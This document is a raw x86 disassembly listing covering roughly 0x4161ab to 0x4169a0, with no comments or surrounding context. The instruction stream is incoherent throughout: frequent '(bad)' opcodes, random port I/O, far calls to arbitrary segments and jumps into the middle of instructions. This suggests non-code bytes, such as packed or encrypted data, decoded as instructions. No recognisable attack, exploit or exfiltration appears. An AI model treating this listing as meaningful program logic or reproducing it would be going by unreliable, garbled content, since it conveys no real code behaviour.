  4161ab:	jnp    0x41622a
  4161ad:	fisttp DWORD PTR [ecx+0x7c8c1cfb]
  4161b3:	jmp    0x416145
  4161b5:	mov    bl,0x7e
  4161b7:	(bad)  
  4161b8:	xchg   edi,eax
  4161b9:	fistp  QWORD PTR [edi]
  4161bb:	les    edi,FWORD PTR [ecx+esi*8+0x26]
  4161bf:	popa   
  4161c0:	out    dx,eax
  4161c1:	pop    esp
  4161c2:	inc    edi
  4161c3:	in     eax,dx
  4161c4:	jl     0x416200
  4161c6:	fwait
  4161c7:	call   0x84378e82
  4161cc:	sbb    BYTE PTR [edx+ecx*2-0x13],al
  4161d0:	loope  0x416173
  4161d2:	jl     0x416193
  4161d4:	mov    ah,0xcd
  4161d6:	aad    0xff
  4161d8:	or     BYTE PTR [edi],al
  4161da:	mov    ?,WORD PTR [ebx-0x6a]
  4161dd:	mov    BYTE PTR [ebp+0x41],0xba
  4161e1:	test   al,0xb6
  4161e3:	rol    DWORD PTR [ebp-0x21f7288b],0xe5
  4161ea:	cmp    cl,BYTE PTR ds:0xf2ef1756
  4161f0:	inc    ecx
  4161f1:	jl     0x416259
  4161f3:	sbb    bl,BYTE PTR [esi+0xf]
  4161f6:	dec    eax
  4161f7:	retf   
  4161f8:	mov    al,0x34
  4161fa:	mov    cs,WORD PTR [edi-0x25a167ad]
  416200:	inc    ebp
  416201:	dec    edx
  416202:	mov    ds:0x29cb96de,al
  416207:	sbb    eax,0xc06780b4
  41620c:	or     edi,edx
  41620e:	ja     0x416234
  416210:	arpl   WORD PTR [ecx+ebx*1-0x4e4b82db],dx
  416217:	xchg   esi,eax
  416218:	popa   
  416219:	push   ds
  41621a:	into   
  41621b:	outs   dx,BYTE PTR ss:[esi]
  41621d:	fisttp DWORD PTR [edx+0x19e6aa5b]
  416223:	lods   eax,DWORD PTR ds:[esi]
  416224:	xlat   BYTE PTR ds:[ebx]
  416225:	jne    0x4161d4
  416227:	adc    BYTE PTR [ecx+0x7d],ah
  41622a:	pop    es
  41622b:	sbb    eax,0xa87cfc0f
  416230:	fldenv [ecx-0x44e82b18]
  416236:	xor    BYTE PTR [esi+0x32],bl
  416239:	mov    eax,ds:0xee92d240
  41623e:	add    BYTE PTR [eax-0x7837747e],0x67
  416245:	adc    eax,0xf82284da
  41624a:	add    DWORD PTR [ebx-0x4f],eax
  41624d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41624e:	in     eax,dx
  41624f:	ins    DWORD PTR es:[edi],dx
  416250:	xor    al,0x66
  416252:	sub    eax,0x6f1091e2
  416257:	jp     0x4161f5
  416259:	scas   al,BYTE PTR es:[edi]
  41625a:	or     al,0x9f
  41625c:	popf   
  41625d:	fsubr  DWORD PTR [ebx+eiz*8-0x3c96a666]
  416264:	add    BYTE PTR [ebx+0x135c6866],0xd2
  41626b:	daa    
  41626c:	push   edx
  41626d:	mov    ebp,DWORD PTR [edi-0x6d60f9a4]
  416273:	int3   
  416274:	nop
  416275:	jo     0x41621e
  416277:	imul   ecx,ebp,0x1869c40
  41627d:	stos   DWORD PTR es:[edi],eax
  41627e:	stc    
  41627f:	xlat   BYTE PTR ds:[ebx]
  416280:	dec    esp
  416281:	aad    0xd7
  416283:	adc    eax,0x2f5ffb4d
  416288:	out    0x1a,eax
  41628a:	xlat   BYTE PTR ds:[ebx]
  41628b:	stos   DWORD PTR es:[edi],eax
  41628c:	xchg   esi,eax
  41628d:	ret    0xa3a
  416290:	push   ss
  416291:	jne    0x416232
  416293:	sbb    al,0xa3
  416295:	cmp    DWORD PTR [edx+0x7ccaa825],ebp
  41629b:	iret   
  41629c:	shl    dh,cl
  41629e:	sub    al,0xe
  4162a0:	dec    esi
  4162a1:	popa   
  4162a2:	sub    al,0x73
  4162a4:	pop    esi
  4162a5:	int    0x32
  4162a7:	test   BYTE PTR [edx+0x2cb0a1e7],cl
  4162ad:	fdivr  DWORD PTR [ebx-0x22]
  4162b0:	std    
  4162b1:	(bad)  
  4162b2:	xor    dl,BYTE PTR [edx]
  4162b4:	sbb    bh,al
  4162b6:	or     eax,0x28b6c0a0
  4162bb:	(bad)  
  4162bc:	out    dx,eax
  4162bd:	imul   edi,ebp,0x7d
  4162c0:	outs   dx,DWORD PTR ds:[esi]
  4162c1:	and    eax,0xd34b4ae9
  4162c6:	and    DWORD PTR [edx+0x643f96a1],ebx
  4162cc:	icebp  
  4162cd:	push   es
  4162ce:	stc    
  4162cf:	inc    ecx
  4162d0:	nop
  4162d1:	and    al,0x90
  4162d3:	test   DWORD PTR [ebx+0x1e42b466],edx
  4162d9:	gs push esi
  4162db:	jge    0x4162ad
  4162dd:	fdiv   QWORD PTR [edx-0x56b6c8fb]
  4162e3:	xchg   ebp,eax
  4162e4:	div    DWORD PTR [edi+0x29]
  4162e7:	cli    
  4162e8:	jmp    0xc0b7:0x9e0742f4
  4162ef:	xor    al,0xd7
  4162f1:	sbb    ecx,esi
  4162f3:	lds    edi,FWORD PTR [edx+0x175f3aff]
  4162f9:	cwde   
  4162fa:	add    BYTE PTR [edx-0x6c2fe653],cl
  416300:	ins    DWORD PTR es:[edi],dx
  416301:	popf   
  416302:	push   ss
  416303:	cdq    
  416304:	lods   eax,DWORD PTR ds:[esi]
  416305:	test   BYTE PTR [eax-0x6d],ah
  416308:	test   al,0x33
  41630a:	sar    DWORD PTR [edx+0x20],0xb9
  41630e:	adc    BYTE PTR [ebx],dh
  416310:	popf   
  416311:	std    
  416312:	out    dx,eax
  416313:	push   esp
  416314:	mov    DWORD PTR [ebx-0x628d4213],ebx
  41631a:	xchg   DWORD PTR [esi],esi
  41631c:	mov    BYTE PTR [esi+0x6a],dl
  41631f:	bound  ebx,QWORD PTR [edx]
  416321:	push   0x342acde
  416326:	outs   dx,DWORD PTR ds:[esi]
  416327:	mov    eax,0x953cce1e
  41632c:	xchg   esi,eax
  41632d:	cdq    
  41632e:	dec    edx
  41632f:	xchg   edx,eax
  416330:	inc    edi
  416331:	(bad)  
  416332:	adc    ebp,eax
  416334:	xor    eax,0x7407ee
  416339:	dec    edx
  41633a:	iret   
  41633b:	out    0xbc,eax
  41633d:	dec    edi
  41633e:	icebp  
  41633f:	ins    DWORD PTR es:[edi],dx
  416340:	cmp    dh,BYTE PTR [eax-0x28]
  416343:	pop    ebx
  416344:	pusha  
  416345:	inc    ecx
  416346:	xchg   ebp,eax
  416347:	sub    DWORD PTR [esi],esi
  416349:	push   esi
  41634a:	push   edi
  41634b:	inc    edx
  41634c:	mov    edx,0x630fcb31
  416351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416352:	out    dx,al
  416353:	mov    ebp,DWORD PTR [ecx]
  416355:	mov    al,0x48
  416357:	enter  0x735e,0xe5
  41635b:	(bad)  
  41635d:	loope  0x416336
  41635f:	cmp    dl,BYTE PTR [eax-0x51732bf]
  416365:	mov    es,WORD PTR [ebx*2-0x4ac954a3]
  41636c:	js     0x41633e
  41636e:	clc    
  41636f:	push   ss
  416370:	rcl    DWORD PTR [ebx+esi*4-0x2],1
  416374:	pop    ebp
  416375:	out    dx,al
  416376:	dec    esi
  416377:	push   eax
  416378:	jmp    0x416370
  41637a:	sub    eax,ebp
  41637c:	rol    BYTE PTR [edi+0x3dc88fb],cl
  416382:	data16 fs out 0xf4,al
  416386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416387:	fild   WORD PTR [edi-0x51752dbe]
  41638d:	gs mov bh,0xa0
  416390:	fcmovnb st,st(0)
  416392:	loope  0x4163d1
  416394:	hlt    
  416395:	pop    es
  416396:	adc    DWORD PTR [edx],esi
  416398:	outs   dx,BYTE PTR ds:[esi]
  416399:	cmp    dl,BYTE PTR [eax]
  41639b:	cdq    
  41639c:	pushf  
  41639d:	or     al,0x32
  41639f:	sbb    dl,al
  4163a1:	or     BYTE PTR [eax+0x19fc913b],ch
  4163a7:	repz test esp,edx
  4163aa:	lea    esp,[ebp-0x8]
  4163ad:	push   es
  4163ae:	mov    eax,0x60664a99
  4163b3:	icebp  
  4163b4:	nop
  4163b5:	(bad)  
  4163b6:	arpl   WORD PTR [eax-0x3efca072],dx
  4163bc:	in     eax,0xd0
  4163be:	inc    ecx
  4163bf:	lods   al,BYTE PTR ds:[esi]
  4163c0:	(bad)
  4163c3:	adc    eax,DWORD PTR [ecx]
  4163c5:	and    DWORD PTR [eax],ebp
  4163c7:	sub    BYTE PTR [ebp+0x7b],bl
  4163ca:	xor    ebx,DWORD PTR [ebx+0x2c75d692]
  4163d0:	or     eax,DWORD PTR [esi-0x458e5e3f]
  4163d6:	mov    eax,0x1811ee0
  4163db:	mov    esi,0x4b7835ea
  4163e0:	shr    BYTE PTR [ebp-0x1e],cl
  4163e3:	out    0x84,al
  4163e5:	push   eax
  4163e6:	or     eax,0xa35cf621
  4163eb:	sbb    eax,0x955d3aa2
  4163f0:	fild   WORD PTR [ebp-0x2fd3e706]
  4163f6:	add    al,0xb2
  4163f8:	je     0x41639e
  4163fa:	ret    
  4163fb:	pop    ss
  4163fc:	push   0x68
  4163fe:	sub    bh,ch
  416400:	rcr    BYTE PTR [eax+esi*2-0x26643458],cl
  416407:	sub    DWORD PTR [ebx],ecx
  416409:	rcl    bh,0x35
  41640c:	inc    edx
  41640d:	inc    edi
  41640e:	cdq    
  41640f:	fild   QWORD PTR [eax-0x3c30389]
  416415:	inc    edx
  416416:	(bad)  
  416417:	sbb    BYTE PTR [edx+0x8],dh
  41641a:	int    0x8b
  41641c:	push   cs
  41641d:	dec    ebx
  41641e:	int3   
  41641f:	inc    ebp
  416420:	xchg   ebx,eax
  416421:	(bad)  
  416422:	cmp    DWORD PTR [edi-0x43],edx
  416425:	mov    bh,0x4b
  416427:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  416429:	test   BYTE PTR [ebx-0x53],0x48
  41642d:	dec    esp
  41642e:	mov    dl,BYTE PTR [ebp-0x1a]
  416431:	inc    esp
  416432:	jp     0x41646a
  416434:	cld    
  416435:	js     0x4163bd
  416437:	mov    ebx,DWORD PTR [esi+0x32]
  41643a:	or     BYTE PTR ds:0x2fbf0ee9,0x3e
  416441:	inc    eax
  416442:	outs   dx,DWORD PTR ds:[esi]
  416443:	xchg   edi,ebx
  416445:	dec    edi
  416446:	call   0x826b66ea
  41644b:	lock cmc 
  41644d:	or     BYTE PTR [edi+0x6b063708],cl
  416453:	ds clc 
  416455:	test   DWORD PTR [esi-0x765ed252],eax
  41645b:	into   
  41645c:	mov    ds:0xcc02544a,eax
  416461:	call   0x512:0x403eaac3
  416468:	jp     0x416425
  41646a:	mov    esp,?
  41646c:	mov    DWORD PTR [eax-0x3bd0b929],edx
  416472:	(bad)  
  416474:	iret   
  416475:	xchg   DWORD PTR [eax+eax*2],ebp
  416478:	adc    al,0xae
  41647a:	mov    al,BYTE PTR [ebp+0x3e35bcfe]
  416480:	xor    al,0x6e
  416482:	xchg   ebx,eax
  416483:	popa   
  416484:	jmp    0x41644b
  416486:	jp     0x416487
  416488:	fwait
  416489:	out    dx,al
  41648a:	adc    bh,BYTE PTR [ebp+0x403b52cd]
  416490:	adc    BYTE PTR [edx-0x685f4174],ah
  416496:	cmc    
  416497:	retf   
  416498:	test   DWORD PTR [eax],0x4afb64ed
  41649e:	cmp    DWORD PTR ds:0x1e2a4766,edx
  4164a4:	xlat   BYTE PTR ds:[ebx]
  4164a5:	daa    
  4164a6:	mov    edi,0x3b984a18
  4164ab:	cmp    DWORD PTR [esi],0xffffff95
  4164ae:	sahf   
  4164af:	clc    
  4164b0:	push   ecx
  4164b1:	mov    esp,0xce5981a6
  4164b6:	adc    DWORD PTR [ebx],0x50
  4164b9:	cwde   
  4164ba:	and    eax,0x94282014
  4164bf:	adc    al,0x3e
  4164c1:	or     al,0x18
  4164c3:	test   dh,cl
  4164c5:	sti    
  4164c6:	and    al,BYTE PTR [ebp-0x584ef750]
  4164cc:	aaa    
  4164cd:	gs addr16 jmp 0x5453:0x5fe20e8d
  4164d6:	cwde   
  4164d7:	jae    0x41645b
  4164d9:	fdiv   QWORD PTR [ecx+eiz*8+0x5bdcb427]
  4164e0:	add    ebx,esp
  4164e2:	jo     0x4164db
  4164e4:	je     0x416478
  4164e6:	cmp    eax,0x56aff940
  4164eb:	not    eax
  4164ed:	sub    al,0xf6
  4164ef:	pop    ebx
  4164f0:	ss cwde 
  4164f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f3:	inc    esi
  4164f4:	mov    ah,0xea
  4164f6:	xchg   esp,eax
  4164f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f8:	fnstenv [esi+0x1a]
  4164fb:	pop    ds
  4164fc:	add    al,BYTE PTR [edi-0x35]
  4164ff:	js     0x4164ac
  416501:	dec    esp
  416502:	sar    BYTE PTR ds:0xc000b53c,1
  416508:	or     edi,eax
  41650a:	xor    eax,DWORD PTR [ebp+0x60ad9179]
  416510:	out    dx,al
  416511:	mov    eax,0x995f14b8
  416516:	(bad)  
  416517:	pusha  
  416518:	das    
  416519:	or     ch,BYTE PTR [bp-0x3f9d]
  41651e:	out    0x64,eax
  416520:	push   esi
  416522:	lahf   
  416523:	out    0x1,eax
  416525:	icebp  
  416526:	mov    ?,WORD PTR [eax-0x3af2ad58]
  41652c:	aas    
  41652d:	add    BYTE PTR [esp+ebp*1],dl
  416530:	sti    
  416531:	loopne 0x41658c
  416533:	and    eax,eax
  416535:	imul   BYTE PTR [edx]
  416537:	ficomp DWORD PTR [eax+0x3e6de918]
  41653d:	dec    esp
  41653e:	mov    ds,WORD PTR [esi-0x3fb6c303]
  416544:	or     eax,0x50b5d153
  416549:	mov    ch,0xa5
  41654b:	adc    BYTE PTR [bx+di],bl
  41654e:	xor    ah,BYTE PTR [esi-0x5d]
  416551:	xchg   ebx,eax
  416552:	push   ss
  416553:	jne    0x416599
  416555:	mov    eax,ds:0xde213efd
  41655a:	push   ss
  41655b:	pop    ds
  41655c:	jne    0x416580
  41655e:	jne    0x4165a3
  416560:	mov    dh,0x55
  416562:	jge    0x4165a5
  416564:	out    dx,al
  416565:	xor    al,0xff
  416567:	cld    
  416568:	popf   
  416569:	inc    edi
  41656a:	ficomp DWORD PTR [eax]
  41656c:	retf   0xe50c
  41656f:	daa    
  416570:	inc    edx
  416571:	mov    ebp,0x3205ed1c
  416576:	(bad)  
  416577:	out    dx,al
  416578:	sub    al,0x9
  41657a:	xchg   ah,al
  41657c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41657d:	mov    ds:0x295f0add,al
  416582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416584:	or     BYTE PTR [edi+eax*8+0x614b8cbf],cl
  41658b:	sbb    BYTE PTR [edx],al
  41658d:	or     BYTE PTR [esi-0x78],ah
  416590:	ds dec ebx
  416592:	jne    0x4165e5
  416594:	popf   
  416595:	mov    edi,0x81488ca5
  41659a:	shl    esi,0x14
  41659d:	or     ecx,ebp
  41659f:	test   BYTE PTR [edx+0x6],bl
  4165a2:	sub    esi,ebx
  4165a4:	jecxz  0x4165df
  4165a6:	int    0xf2
  4165a8:	loopne 0x416568
  4165aa:	pop    esi
  4165ab:	(bad)  
  4165ac:	shr    BYTE PTR [edi+0x7804672c],cl
  4165b2:	add    eax,DWORD PTR [ecx+0x41564b21]
  4165b8:	mov    BYTE PTR [eax-0x75750ce3],dl
  4165be:	mov    ah,0x5e
  4165c0:	into   
  4165c1:	retf   
  4165c2:	repnz or al,0xeb
  4165c5:	test   DWORD PTR [ebx+0x47],0xce124d9c
  4165cc:	push   eax
  4165cd:	mov    cl,0x93
  4165cf:	cmp    esp,DWORD PTR [ecx+edi*2]
  4165d2:	aaa    
  4165d3:	enter  0x2615,0x1e
  4165d7:	mov    ebx,ebx
  4165d9:	xchg   edx,eax
  4165da:	xchg   esp,eax
  4165db:	scas   eax,DWORD PTR es:[edi]
  4165dc:	int    0xee
  4165de:	xor    eax,0x7befb2f
  4165e3:	ret    
  4165e4:	pop    ecx
  4165e5:	out    0xd7,eax
  4165e7:	outs   dx,DWORD PTR ds:[esi]
  4165e8:	ins    BYTE PTR es:[edi],dx
  4165e9:	ins    BYTE PTR es:[edi],dx
  4165ea:	lahf   
  4165eb:	int3   
  4165ec:	pop    ebx
  4165ed:	arpl   WORD PTR [eax-0x6f],cx
  4165f0:	add    bh,BYTE PTR [esi-0x5b]
  4165f3:	in     eax,0x2d
  4165f5:	call   0x99e8:0x1306a51b
  4165fc:	es xor al,0x5b
  4165ff:	int    0x82
  416601:	pop    ss
  416602:	mov    dl,0xa6
  416604:	int    0x39
  416606:	mov    eax,ds:0xe923cd6c
  41660b:	jge    0x4165ee
  41660d:	cs sti 
  41660f:	fwait
  416610:	shr    BYTE PTR [edx+0x11],1
  416613:	daa    
  416614:	sbb    esi,0x3a
  416617:	je     0x4165f9
  416619:	adc    BYTE PTR [edi+0x2c],0xbd
  41661d:	call   0xdb3c:0x7151
  416623:	jl     0x416643
  416625:	pop    esi
  416626:	adc    DWORD PTR [edx+0x3],0xf82c50de
  41662d:	dec    ebp
  41662e:	dec    ecx
  41662f:	fs iret 
  416631:	push   ebp
  416632:	pop    ds
  416633:	jbe    0x41664a
  416635:	mov    al,ds:0x81751f02
  41663a:	pop    ecx
  41663b:	jae    0x4166b1
  41663d:	add    eax,0xdcb766d9
  416642:	pop    esp
  416643:	dec    di
  416645:	cmp    ebx,DWORD PTR [esp+edi*4+0x29c9c60c]
  41664c:	mov    esp,0x7f3ccfc6
  416651:	dec    esi
  416652:	into   
  416653:	xchg   esi,eax
  416654:	push   ecx
  416655:	lock out 0x66,eax
  416658:	sub    ebp,DWORD PTR [edx-0x67]
  41665b:	(bad)
  41665f:	inc    ebp
  416660:	inc    esi
  416661:	idiv   DWORD PTR ds:0x89e9762c
  416667:	dec    ebx
  416668:	jecxz  0x41663d
  41666a:	sbb    eax,0xf1bc8d18
  41666f:	ret    0x926
  416672:	jnp    0x4166e9
  416674:	jne    0x4166c4
  416676:	cli    
  416677:	sbb    al,0x81
  416679:	fidivr DWORD PTR [edx+eax*4-0x4419b05f]
  416680:	loop   0x41667e
  416682:	jl     0x4166c8
  416684:	in     eax,dx
  416685:	xchg   BYTE PTR [esi+0x2f6f2a54],ch
  41668b:	push   0x9756b6ff
  416690:	xchg   esp,eax
  416691:	ficom  WORD PTR ds:0xd50be92e
  416697:	out    0x6f,eax
  416699:	ret    
  41669a:	mov    ds,ecx
  41669c:	lds    edi,FWORD PTR [edx-0x2048680d]
  4166a2:	pop    esi
  4166a3:	adc    DWORD PTR [edx],ebp
  4166a5:	add    ch,BYTE PTR [ecx-0x57086e04]
  4166ab:	pop    ss
  4166ac:	cs in  eax,dx
  4166ae:	daa    
  4166af:	aas    
  4166b0:	cs push cs
  4166b2:	and    dh,BYTE PTR [edi]
  4166b4:	stos   DWORD PTR es:[edi],eax
  4166b5:	imul   ebx,DWORD PTR [esi+ecx*8],0x83df85b9
  4166bc:	fiadd  WORD PTR [eax]
  4166be:	jno    0x416733
  4166c0:	mov    dh,0x11
  4166c2:	and    al,0x0
  4166c4:	shl    DWORD PTR [ecx-0x32],cl
  4166c7:	and    al,0x9
  4166c9:	mov    DWORD PTR [eax+esi*1],eax
  4166cc:	push   eax
  4166cd:	cmp    BYTE PTR [ebp+0x74],ch
  4166d0:	add    eax,0xc4ac7fa0
  4166d5:	jns    0x4166ee
  4166d7:	jecxz  0x4166e3
  4166d9:	rcl    cl,cl
  4166db:	xor    al,0xb7
  4166dd:	mov    bh,0x0
  4166df:	out    dx,al
  4166e0:	sub    al,0xf4
  4166e2:	jns    0x4166a6
  4166e4:	imul   esp,edi,0x73
  4166e7:	sar    edx,1
  4166e9:	ror    BYTE PTR [edi+0x3a],cl
  4166ec:	cmp    eax,0xdc8c32ff
  4166f1:	inc    DWORD PTR [edi-0x3ec11064]
  4166f7:	pusha  
  4166f8:	repz arpl WORD PTR [edi+0x622db042],di
  4166ff:	push   0xc8762440
  416704:	sbb    al,0xd9
  416706:	sub    eax,ebp
  416708:	call   0xe2c199cd
  41670d:	xchg   DWORD PTR [eax+0x38],ebp
  416710:	pop    ecx
  416711:	call   0x128a:0xfc6c17d4
  416718:	add    al,0x48
  41671a:	jno    0x416775
  41671c:	pop    ss
  41671d:	mov    ds:0xc14fe232,eax
  416722:	outs   dx,BYTE PTR ds:[esi]
  416723:	xchg   ebp,eax
  416724:	sbb    al,0x25
  416726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416727:	lods   eax,DWORD PTR ds:[esi]
  416728:	imul   esi,DWORD PTR [esi+0x1febf8e1],0x61
  41672f:	out    0x14,eax
  416731:	imul   ebp,esi,0x59d75c0e
  416737:	ja     0x416709
  416739:	jne    0x41676d
  41673b:	daa    
  41673c:	shr    BYTE PTR [ecx],1
  41673e:	sahf   
  41673f:	inc    esp
  416740:	adc    edi,edx
  416742:	add    BYTE PTR [ecx-0x3a],dl
  416745:	mov    edi,0xac13bfde
  41674a:	clc    
  41674b:	jmp    0x416770
  41674d:	lahf   
  41674e:	push   esi
  41674f:	cmp    bl,0xbb
  416752:	cmp    eax,0x25e526da
  416757:	clc    
  416758:	dec    ebp
  416759:	push   edi
  41675a:	xchg   ebx,eax
  41675b:	sub    al,0x9a
  41675d:	add    edi,DWORD PTR [ebx-0x4a]
  416760:	sahf   
  416761:	iret   
  416762:	cmovg  ebp,DWORD PTR [edi]
  416765:	ret    
  416766:	test   DWORD PTR [ebx],esp
  416768:	push   ebx
  416769:	sahf   
  41676a:	outs   dx,BYTE PTR ds:[esi]
  41676b:	xchg   esp,eax
  41676c:	test   eax,0x972d1372
  416771:	imul   DWORD PTR [ebx-0x78]
  416774:	lea    ecx,[eax]
  416776:	test   al,0xc9
  416778:	push   esp
  416779:	adc    cl,bl
  41677b:	inc    edi
  41677c:	and    eax,0xa57f54b3
  416781:	in     al,dx
  416782:	not    DWORD PTR [edi-0x45]
  416785:	cmp    ecx,DWORD PTR [ebp+esi*4+0x7cdf6901]
  41678c:	jnp    0x416712
  41678e:	push   ecx
  41678f:	sti    
  416790:	push   es
  416791:	fnclex 
  416793:	mov    ebx,0xb88c4226
  416798:	add    DWORD PTR [eax],ecx
  41679a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41679b:	add    edi,esi
  41679d:	dec    ebp
  41679e:	(bad)  
  41679f:	mov    esi,0x3e6608ea
  4167a4:	sbb    bl,BYTE PTR [ebx-0x5ce8e0c9]
  4167aa:	pop    edx
  4167ab:	frstor [ebp-0x790f68f4]
  4167b1:	and    DWORD PTR [edi],esp
  4167b3:	push   ds
  4167b4:	fisttp WORD PTR ds:[esp+edx*4+0x33f2385d]
  4167bc:	xchg   edx,eax
  4167bd:	das    
  4167be:	ja     0x416802
  4167c0:	adc    eax,0x57469f3d
  4167c5:	lods   al,BYTE PTR ds:[esi]
  4167c6:	mov    dh,0xb5
  4167c8:	shl    dl,cl
  4167ca:	test   DWORD PTR [ecx+0xa],ebx
  4167cd:	dec    ecx
  4167ce:	shl    BYTE PTR [ecx],0x52
  4167d1:	fs cdq 
  4167d3:	call   0x13be:0x95b76892
  4167da:	dec    edx
  4167db:	cmp    BYTE PTR [eax+0x1ab05e6d],bl
  4167e1:	ret    0x436d
  4167e4:	push   edi
  4167e5:	and    al,0x41
  4167e7:	sub    edi,DWORD PTR [ebx]
  4167e9:	pop    ds
  4167ea:	lock mov fs,ebx
  4167ed:	mov    DWORD PTR [edx+0x26752827],ecx
  4167f3:	mov    ch,0x95
  4167f5:	sub    BYTE PTR [ebp+0x3a93448d],ah
  4167fb:	xor    DWORD PTR [edi],0xffffffc4
  4167fe:	sar    BYTE PTR [ecx-0x7402a97c],1
  416804:	jne    0x41687c
  416806:	jmp    0xa1b351e0
  41680b:	in     al,dx
  41680c:	rcl    DWORD PTR [eax+0x21f6e52b],0x11
  416813:	mov    bl,0x40
  416815:	int    0x4
  416817:	mov    edi,esp
  416819:	or     DWORD PTR [esi-0x64d7a6dc],ebx
  41681f:	dec    ebx
  416820:	out    dx,eax
  416821:	call   0x15fc:0xb4556b10
  416828:	in     al,dx
  416829:	xchg   BYTE PTR [ebp-0x10],bh
  41682c:	das    
  41682d:	jge    0x41680f
  41682f:	outs   dx,DWORD PTR ds:[esi]
  416830:	mov    cl,BYTE PTR [ecx-0x5d]
  416833:	push   ss
  416834:	jno    0x41681a
  416836:	push   ss
  416837:	jo     0x416808
  416839:	adc    bh,BYTE PTR [esi]
  41683b:	(bad)  
  41683c:	cs xchg ecx,eax
  41683e:	cs mov ecx,0xe4eb3014
  416844:	inc    edi
  416845:	or     eax,0x55210385
  41684a:	jo     0x41683a
  41684c:	sub    al,0x2b
  41684e:	xchg   ecx,eax
  41684f:	ss sbb eax,0xd67d2a2c
  416855:	int    0xac
  416857:	inc    ecx
  416858:	adc    ch,cl
  41685a:	mov    bh,0x14
  41685c:	cmp    al,0x6a
  41685e:	jl     0x4168a7
  416860:	and    bh,bl
  416862:	out    dx,eax
  416863:	mov    ecx,DWORD PTR cs:[esi+0x7852d881]
  41686a:	dec    ebp
  41686b:	push   cs
  41686c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41686d:	ds std 
  41686f:	fwait
  416870:	cmc    
  416871:	mov    WORD PTR [edx+0x187809cc],fs
  416877:	jae    0x416890
  416879:	or     dh,0xd5
  41687c:	xchg   ecx,eax
  41687d:	fstp   QWORD PTR [eax]
  41687f:	jno    0x4168fb
  416881:	jns    0x416878
  416883:	mov    eax,ds:0xddc9bf97
  416888:	ins    BYTE PTR es:[edi],dx
  416889:	(bad)  
  41688a:	push   0xdf0aa202
  41688f:	stc    
  416890:	lock gs popa 
  416893:	mov    bl,0xd6
  416895:	cmp    DWORD PTR [esi+0x70],eax
  416898:	cmc    
  416899:	data16 rcr BYTE PTR [esi-0x44],1
  41689d:	cs sbb eax,0x61e9298c
  4168a3:	fcom   QWORD PTR [ebp+ecx*1-0x730ea642]
  4168aa:	cld    
  4168ab:	repnz retf 
  4168ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ae:	mov    dh,0xdc
  4168b0:	ins    DWORD PTR es:[edi],dx
  4168b1:	cmp    al,0xbc
  4168b3:	pushf  
  4168b4:	inc    ebp
  4168b5:	sub    eax,DWORD PTR [ecx+eiz*1]
  4168b8:	mov    ds:0x8e1b2ae0,al
  4168bd:	leave  
  4168be:	pop    ebx
  4168bf:	lock sbb bh,bh
  4168c2:	cmp    al,0x3b
  4168c4:	gs xchg edx,eax
  4168c6:	mov    bh,ch
  4168c8:	jp     0x416907
  4168ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168cb:	mov    ds:0x7e5d731,al
  4168d0:	test   al,0xd
  4168d2:	cmp    ch,BYTE PTR [ecx+0x7bd6d4ca]
  4168d8:	cmc    
  4168d9:	and    eax,0x9604d17d
  4168de:	push   0xffffffa9
  4168e0:	test   cl,al
  4168e2:	xchg   esi,eax
  4168e3:	lods   eax,DWORD PTR ds:[esi]
  4168e4:	adc    al,ah
  4168e6:	or     DWORD PTR [edx-0x74ef8500],ecx
  4168ec:	cmp    al,0x5d
  4168ee:	jbe    0x4168c9
  4168f0:	out    dx,al
  4168f1:	adc    cl,BYTE PTR [ecx-0x70]
  4168f4:	mov    ecx,0xd3bdcbcb
  4168f9:	arpl   WORD PTR [ebx+0x6ad14b0b],di
  4168ff:	jo     0x4168dd
  416901:	dec    esi
  416902:	push   eax
  416903:	popf   
  416904:	mov    eax,ds:0x76b5c996
  416909:	sbb    eax,edx
  41690b:	clc    
  41690c:	imul   ecx,DWORD PTR [edx],0x6b
  41690f:	fmul   st(3),st
  416911:	icebp  
  416912:	in     eax,0xa1
  416914:	pop    ebp
  416915:	idiv   BYTE PTR [ebx]
  416917:	jg     0x4168ba
  416919:	push   ds
  41691a:	aas    
  41691b:	imul   ecx,DWORD PTR [eax-0x3a5e724d],0xf10af40d
  416925:	inc    edx
  416926:	stc    
  416927:	(bad)  
  416928:	mov    es,ebx
  41692a:	and    eax,0x6ab17732
  41692f:	jbe    0x416918
  416931:	(bad)
  416935:	lock shl BYTE PTR [ecx+0x6d],1
  416939:	mov    bl,0x16
  41693b:	mov    edi,0x8ed07bef
  416940:	cmp    esp,DWORD PTR [eax-0x20a9c590]
  416946:	jne    0x4168e1
  416948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416949:	(bad)  
  41694a:	js     0x41698b
  41694c:	dec    ecx
  41694d:	not    edi
  41694f:	in     eax,dx
  416950:	inc    ebp
  416951:	xor    DWORD PTR [ebp-0x762ce6f],esp
  416957:	dec    esp
  416958:	outs   dx,BYTE PTR ds:[esi]
  416959:	push   es
  41695a:	aam    0xd5
  41695c:	xlat   BYTE PTR ds:[ebx]
  41695d:	fsubr  DWORD PTR [ebx-0x56]
  416960:	rcr    BYTE PTR [edi],1
  416962:	cld    
  416963:	cmp    BYTE PTR [edi-0x7133b52e],bl
  416969:	iret   
  41696a:	mov    esi,0x864edfee
  41696f:	enter  0xb84d,0x90
  416973:	mov    ?,WORD PTR [esi+0x62]
  416976:	jp     0x416989
  416978:	loop   0x416902
  41697a:	les    ecx,FWORD PTR [ecx+eiz*2-0x76b1a5ff]
  416981:	shl    BYTE PTR [edx-0x6b],0x80
  416985:	fnsave [edi]
  416987:	sub    DWORD PTR [esi+0x56],edx
  41698a:	jo     0x416911
  41698c:	aad    0x26
  41698e:	mov    ah,0x21
  416990:	inc    edx
  416991:	pushf  
  416992:	call   0x30e3:0x7b74eccb
  416999:	xchg   ebx,eax
  41699a:	pop    es
  41699b:	rcr    BYTE PTR [esi+ebp*4+0x22],0xef
  4169a0:	ret    0xdadb
